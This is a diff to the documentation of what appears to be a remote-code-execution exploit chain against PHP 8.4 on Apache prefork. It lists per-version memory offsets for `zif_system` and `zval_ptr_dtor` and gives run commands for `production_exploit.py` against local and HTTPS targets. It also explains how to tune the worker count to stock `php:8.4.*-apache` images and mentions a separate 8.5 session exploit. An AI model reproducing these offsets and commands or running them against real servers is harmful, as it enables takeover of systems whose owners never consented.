@@ -12,25 +12,29 @@ Updated: 2026-10-25
 
 | PHP | `zif_system` | `zval_ptr_dtor` | Verification |
 |---|---:|---:|---|
-| 8.4.19 | `0x4472f0` | `0x63efe0` | RCE, single worker and 150 workers |
+| 8.4.19 | `0x4472f0` | `0x63efe0` | RCE, custom 1-worker pool and stock 150-worker pool |
 | 8.4.20 | `0x447530` | `0x63f9e0` | RCE, single worker |
 | 8.4.21 | `0x4623b0` | `0x65afe0` | RCE, single worker |
 | 8.4.22 | `0x462d30` | `0x65b9e0` | RCE, single worker |
 | 8.4.23 | `0x462d70` | `0x65b9a0` | RCE, single worker |
 | 8.4.24 | `0x464530` | `0x65d1e0` | RCE, single worker |
 | 8.4.25 | `0x464c70` | `0x65dc60` | RCE, single worker |
-| 8.4.26 | `0x465370` | `0x65eb60` | RCE, single worker and 150 workers |
+| 8.4.26 | `0x465370` | `0x65eb60` | RCE, custom 1-worker pool and stock 150-worker pool |
 
 Run:
 
 ```bash
 python3 production_exploit.py \
-    --host 127.0.0.1 --port 1337 --workers 1 \
+    --host 127.0.0.1 --port 1337 --workers 150 \
     --version 8.4.26 --host-proof out/p1
 ```
 
 The chain pins `--workers - 1` partial POSTs open and uses the remaining
 prefork child for all four stages. A1/B1 are chunked; A2/B2 are fixed-length.
+`--workers` must match the target pool: 150 for stock `php:8.4.*-apache` images
+and `lab/prod-8426`; 1 only for a target whose MPM has `MaxRequestWorkers 1`.
+The 8.5 session chain instead uses `session_exploit.py --rotate` and does not
+take a worker count.
 
 ### HTTPS
 
@@ -39,7 +43,7 @@ prefork child for all four stages. A1/B1 are chunked; A2/B2 are fixed-length.
 ```bash
 python3 production_exploit.py \
     --host target.example --port 443 --https \
-    --servername target.example --workers 1 \
+    --servername target.example --workers 150 \
     --version 8.4.26 --host-proof out/p1
 ```
 
